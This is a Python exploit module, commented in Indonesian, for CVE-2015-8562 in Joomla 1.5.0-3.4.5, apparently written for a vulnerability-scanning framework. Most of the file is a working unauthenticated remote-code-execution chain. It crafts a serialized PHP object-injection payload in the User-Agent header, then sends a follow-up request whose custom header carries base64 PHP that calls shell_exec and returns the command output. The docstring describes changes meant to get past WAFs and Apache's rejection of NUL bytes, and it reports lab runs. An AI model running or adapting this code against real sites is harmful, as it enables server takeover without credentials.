#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2015-8562 — object injection -> RCE TANPA AUTENTIKASI (header disimpan ke session).
Affected : Joomla! 1.5.0 - 3.4.5   |   Patched: 3.4.6
Referensi: advisory JSST [20151214] "Core - Remote Code Execution",
           Sucuri (Marc-Alexandre Montpas), EDB 38977 / 39033, msf
           exploit/multi/http/joomla_http_header_rce, PHP bug #70219.

RANTAI (semua titik diverifikasi dari sumber 3.4.5):

1. libraries/joomla/session/session.php :: JSession::_start() — blok 'fix_browser'
   menulis $_SERVER['HTTP_USER_AGENT'] APA ADANYA ke session
   (`$this->set('session.client.browser', $_SERVER['HTTP_USER_AGENT'])`).
   DIFF 3.4.5 -> 3.4.6: seluruh blok itu DIHAPUS (dan fix_adress/fix_browser
   ditambah filter_var) — inilah patch vektornya. UA adalah data penyerang yang
   tidak divalidasi, dan session handler 'database' menuliskannya ke #__session.

2. Truncation: payload diakhiri urutan UTF-8 4-byte. Kolom `data` memakai charset
   utf8 (3-byte) -> MySQL memotong data pada urutan tak valid itu (sql_mode non-strict),
   sehingga serialisasi session berhenti di tengah: penanda panjang `s:<N>:"..."` dan
   sisa array hilang. (Pada utf8mb4 truncation TIDAK terjadi -> rantai gagal.)

3. Pembacaan berikutnya: PHP <= 5.6.12 TIDAK berhenti pada error unserialize pertama
   (bug #70219 diperbaiki di 5.4.45/5.5.29/5.6.13). Reader "resync" pada '|' berikutnya,
   sehingga objek yang kita selipkan (`<rand>}}__<rand>|O:...`) ikut di-unserialize.
   Versi PHP yang rentan: <=5.4.44, 5.5.0-5.5.28, 5.6.0-5.6.12.

4. Gadget: O:21:"JDatabaseDriverMysqli" ->
     __destruct()                    (libraries/joomla/database/driver/mysqli.php:81)
     -> disconnect()                 (idem :199)
     -> foreach ($this->disconnectHandlers as $h)
          call_user_func_array($h, array(&$this));      (idem :206)  <- sink
   $h = [SimplePie, 'init'], dan SimplePie::init() memanggil
     call_user_func($this->cache_name_function, $this->feed_url)  (simplepie.php:1550)
   dengan cache_name_function='assert' -> assert(<kode PHP>) -> RCE.

5. Kelas SimplePie TIDAK di-autoload Joomla. Karena itu properti pertama payload
   berisi O:17:"JSimplepieFactory":0:{} — memuat
   libraries/legacy/simplepie/factory.php yang di file-scope memanggil
   jimport('simplepie.simplepie'), sehingga objek SimplePie pada pass yang sama bisa
   diinstansiasi. (Tanpa properti ini rantai mati: kelas menjadi __PHP_Incomplete_Class.)

PERBAIKAN TERHADAP PoC YANG ADA (gap analysis):
  * PoC publik (msf/EDB) menuliskan nama properti protected sebagai byte NUL mentah
    (\0\0\0nama). Apache >= 2.4.25 (dan banyak WAF) MENOLAK byte NUL di header
    -> HTTP 400, rantai tidak pernah sampai ke server. Modul ini memakai tipe
    serialisasi `S` dengan escape hex (\00*\00nama) sehingga SELURUH payload ASCII
    murni. Diverifikasi: `s:`/`\0\0\0` TIDAK mengeset properti protected (hanya
    membuat properti dinamis), sedangkan `S:`+`\00*\00` mengesetnya.
  * msf hanya menilai dari X-Powered-By + versi Joomla; modul ini memverifikasi
    OUTCOME: perintah dieksekusi dan keluarannya diambil dari respons HTTP.

BUKTI LAB (2026-11-08, infrastruktur sendiri):
  mp-j345d @8124  Joomla 3.4.5 + PHP 5.6.12 + MySQL 5.7 (session handler database)
      -> PWN: keluaran `id` = uid=33(www-data) gid=33(www-data) groups=33(www-data)
  mp-j346d @8125  Joomla 3.4.6 + PHP 5.6.12 (konfigurasi sama)          -> CLEAN
  mp-j345d40 @8126 Joomla 3.4.5 + PHP 5.6.40 (di atas patch #70219)     -> CLEAN
  (Dua kontrol negatif membuktikan patch Joomla dan batas versi PHP sama-sama nyata.)
"""

import base64
import random
import re
import socket
import ssl
import string
import urllib.parse

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"

# Rentang rentan: 1.5.0 - 3.4.5 (dari advisory + NVD)
VULN_MAX = (3, 4, 5)

# Jendela PHP rentan (bug #70219 diperbaiki di 5.4.45 / 5.5.29 / 5.6.13)
PHP_OK_MAX = {"5.4": (5, 4, 44), "5.5": (5, 5, 28), "5.6": (5, 6, 12)}

MARK_A = "MP8562["
MARK_B = "]"


def _joomla_version(t, h):
    cached = getattr(t, "_j8562ver", None)
    if cached is not None:
        return cached
    val = (None, "")
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                val = (v, m.group(1))
    try:
        t._j8562ver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _php_version(t, h):
    r = h.get(t.url + "/", allow_redirects=False)
    if r is None:
        return None, ""
    raw = (r.headers.get("X-Powered-By") or "").strip()
    m = re.search(r"PHP/([0-9.]+)", raw, re.I)
    if not m:
        return None, raw
    return parse_ver(m.group(1)), raw


def _php_vulnerable(ver):
    """True = di jendela PHP rentan, False = sudah dipatch, None = tidak diketahui."""
    if ver is None:
        return None
    if ver[0] >= 7:
        return False
    if ver[0] == 4 or (ver[0] == 5 and ver[1] <= 2):
        return True
    key = f"{ver[0]}.{ver[1]}"
    if key in PHP_OK_MAX:
        return ver_le(ver, PHP_OK_MAX[key])
    # 5.3.x dan versi tak terdaftar: anggap rentan bila lebih tua dari 5.6.13
    return ver_le(ver, (5, 6, 12))


def _rand(n):
    return "".join(random.choice(string.ascii_letters) for _ in range(n))


def _rand_4byte_utf8():
    while True:
        cp = random.randint(0x10000, 0x10FFFF)
        if not (0xD800 <= cp <= 0xDFFF):
            return chr(cp).encode("utf-8")


def _payload_ua(header_name):
    """User-Agent yang menyelipkan objek berseri ke dalam session (seluruhnya ASCII)."""
    pre = _rand(5) + "}}__" + _rand(10) + "|"
    pre_pay = (
        'O:21:"JDatabaseDriverMysqli":3:{'
        # pembawa yang memicu jimport('simplepie.simplepie') saat autoload
        'S:4:"\\00\\00\\00a";O:17:"JSimplepieFactory":0:{}'
        'S:21:"\\00*\\00disconnectHandlers";a:1:{i:0;a:2:{i:0;'
        'O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}'
        's:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";'
        's:10:"javascript";i:9999;s:8:"feed_url";'
    )
    code = f"eval(base64_decode($_SERVER['HTTP_{header_name}']));JFactory::getConfig();exit;"
    post = '";}i:1;s:4:"init";}}S:13:"\\00*\\00connection";i:1;}'
    body = (pre + pre_pay + f's:{len(code)}:"' + code + post).encode("latin-1")
    return body + _rand_4byte_utf8()


def _raw(host, port, scheme, headers, path="/", timeout=20):
    """Permintaan HTTP mentah (kontrol byte penuh; payload memuat 4-byte UTF-8)."""
    req = f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n".encode()
    for k, v in headers:
        req += k.encode("latin-1") + b": " + \
               (v if isinstance(v, bytes) else v.encode("latin-1")) + b"\r\n"
    req += b"Connection: close\r\n\r\n"
    sock = socket.create_connection((host, port), timeout)
    if scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    try:
        sock.sendall(req)
        buf = b""
        while True:
            chunk = sock.recv(65535)
            if not chunk:
                break
            buf += chunk
    finally:
        sock.close()
    head, _, body = buf.partition(b"\r\n\r\n")
    m = re.match(rb"HTTP/[\d.]+\s+(\d+)", head)
    status = int(m.group(1)) if m else 0
    return status, head.decode("latin-1", "replace"), body.decode("utf-8", "replace")


def _endpoint(url):
    u = urllib.parse.urlsplit(url if "//" in url else "http://" + url)
    scheme = u.scheme or "http"
    host = u.hostname or ""
    port = u.port or (443 if scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    return scheme, host, port, path


def _run_command(t, cmd, timeout=20):
    """Jalankan perintah melalui rantai; kembalikan keluaran atau None."""
    scheme, host, port, path = _endpoint(t.url)
    hdr = "X" + _rand(7).upper()
    safe = cmd.replace("\\", "\\\\").replace("'", "\\'")
    php = (f"echo '{MARK_A}'.shell_exec('" + safe + f"').'{MARK_B}';exit;")
    ua = _payload_ua(hdr)
    try:
        st1, head1, _ = _raw(host, port, scheme, [("User-Agent", ua)], path, timeout)
    except Exception as exc:  # noqa: BLE001
        return None, f"langkah-1 gagal: {exc}"
    cookie = None
    for line in head1.split("\r\n"):
        if line.lower().startswith("set-cookie:"):
            cookie = line.split(":", 1)[1].strip().split(";")[0]
            break
    if not cookie:
        return None, f"langkah-1 tidak mengembalikan cookie sesi (HTTP {st1})"
    b64 = base64.b64encode(php.encode()).decode()
    try:
        st2, _, body2 = _raw(host, port, scheme,
                             [("User-Agent", "Mozilla/5.0"), ("Cookie", cookie), (hdr, b64)],
                             path, timeout)
    except Exception as exc:  # noqa: BLE001
        return None, f"langkah-2 gagal: {exc}"
    m = re.search(re.escape(MARK_A) + r"(.*?)" + re.escape(MARK_B), body2, re.S)
    if m:
        return m.group(1).strip(), f"HTTP {st1}/HTTP {st2}"
    return None, f"penanda tidak muncul (HTTP {st1}/HTTP {st2})"


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"

    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    phpv, php_raw = _php_version(t, h)

    ev = f"joomla={ver_s} | php={php_raw or 'tidak terungkap'}"
    if ver[0] >= 4 or (ver[0] == 3 and not ver_le(ver, VULN_MAX)):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (1.5.0 - 3.4.5)", ev
    if ver[0] == 3 and ver[1] < 4:
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (1.5.0 - 3.4.5)", ev

    php_ok = _php_vulnerable(phpv)
    if php_ok is False:
        return (ST_CLEAN,
                f"Joomla {ver_s} rentan secara versi, tetapi PHP {php_raw} sudah memuat "
                f"perbaikan #70219 (>=5.6.13/5.5.29/5.4.45) sehingga deserialisasi session "
                f"berhenti pada error pertama — rantai tidak jalan",
                ev)
    if php_ok is None:
        return (ST_INFO,
                f"Joomla {ver_s} — header disimpan tanpa validasi ke session (vektor ada). "
                f"Versi PHP tidak terungkap: rantai hanya tereksekusi pada PHP <=5.6.12 "
                f"dan session handler 'database'",
                ev)
    return (ST_INFO,
            f"Joomla {ver_s} + PHP {php_raw} — object injection via header ke session; "
            f"rantai RCE tersedia (prasyarat tambahan: session handler 'database' dan kolom "
            f"utf8 3-byte)",
            ev)


def exploit(t, h, opts):
    """
    Outcome terkontrol: eksekusi perintah di server tanpa autentikasi, keluaran
    perintah diambil dari respons HTTP.
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if ver[0] >= 4 or (ver[0] == 3 and (ver[1] < 4 or not ver_le(ver, VULN_MAX))):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan (1.5.0 - 3.4.5)", \
                         f"joomla={ver_s}"

    phpv, php_raw = _php_version(t, h)
    cmd = getattr(opts, "cmd", None) or "id"
    out, info = _run_command(t, cmd)
    ev = f"joomla={ver_s} | php={php_raw or 'tidak terungkap'} | {info}"
    if out:
        return (ST_PWN,
                f"RCE tanpa autentikasi: `{cmd}` -> {out}",
                ev)
    if _php_vulnerable(phpv) is False:
        return (ST_CLEAN,
                f"Joomla {ver_s} — rantai tidak tereksekusi; PHP {php_raw} sudah dipatch "
                f"(#70219)", ev)
    return (ST_VULN,
            f"Joomla {ver_s} — injeksi objek terkirim tetapi perintah tidak tereksekusi; "
            f"periksa session handler (harus 'database') dan charset kolom session (utf8 "
            f"3-byte) serta versi PHP (<=5.6.12)", ev)


register(CveModule(
    cve="CVE-2015-8562",
    cluster="joomla_core",
    title="Joomla Core - object injection tanpa autentikasi via header yang disimpan ke "
          "session (User-Agent/X-Forwarded-For) -> RCE",
    vclass="object injection",
    cvss="9.8",
    severity="critical",
    cwe="CWE-502",
    product="Joomla! Core (JSession::_start + session handler database + gadget "
            "JDatabaseDriverMysqli/SimplePie)",
    versions_affected="1.5.0-3.4.5",
    status="verified",
    requires=[
        "PHP <= 5.4.44 / 5.5.0-5.5.28 / 5.6.0-5.6.12 (perbaikan unserialize #70219 di "
        "5.4.45/5.5.29/5.6.13) — PHP 7+ tidak bekerja",
        "session handler 'database' (JSessionStorageDatabase) agar data session masuk "
        "ke #__session dan bisa terpotong",
        "kolom session.data ber-charset utf8 (3-byte); pada utf8mb4 tidak terjadi "
        "truncation sehingga rantai gagal",
        "tidak butuh kredensial",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Vektor: JSession::_start() menyimpan $_SERVER['HTTP_USER_AGENT'] (juga "
        "X-Forwarded-For ke session.client.forwarded) apa adanya ke session. Diff "
        "3.4.5 -> 3.4.6 MENGHAPUS blok fix_browser yang menulis UA ke session -> patch. "
        "Payload diakhiri urutan UTF-8 4-byte; kolom utf8 MySQL memotong data di situ "
        "sehingga penanda panjang serialisasi rusak. PHP <= 5.6.12 tidak berhenti pada "
        "error unserialize pertama (bug #70219) -> reader resync pada '|' dan objek yang "
        "diselipkan ikut di-unserialize. Gadget: JDatabaseDriverMysqli::__destruct -> "
        "disconnect() -> call_user_func_array([SimplePie,'init'], [&$this]) "
        "(driver/mysqli.php:206) -> SimplePie::init() -> "
        "call_user_func($cache_name_function,$feed_url) dengan 'assert' (simplepie.php:1550) "
        "-> RCE. Kelas SimplePie hanya termuat setelah JSimplepieFactory di-autoload "
        "(jimport di file-scope libraries/legacy/simplepie/factory.php), karena itu "
        "properti pertama payload berisi objek itu. Penyempurnaan atas PoC publik: nama "
        "properti protected ditulis dengan tipe S + escape \\00*\\00 sehingga payload "
        "100% ASCII (byte NUL mentah ditolak Apache >=2.4.25 / WAF -> HTTP 400). Bukti "
        "lab: 3.4.5+PHP5.6.12 @8124 -> PWN (uid=33(www-data)); 3.4.6 @8125 -> CLEAN; "
        "3.4.5+PHP5.6.40 @8126 -> CLEAN (membuktikan patch PHP). Lab: megapack-php5612 "
        "(PHP 5.6.12 + mysqli kompilasi manual) + megapack-db57 (MySQL 5.7, sql_mode "
        "kosong, kolom session utf8)."
    ),
))
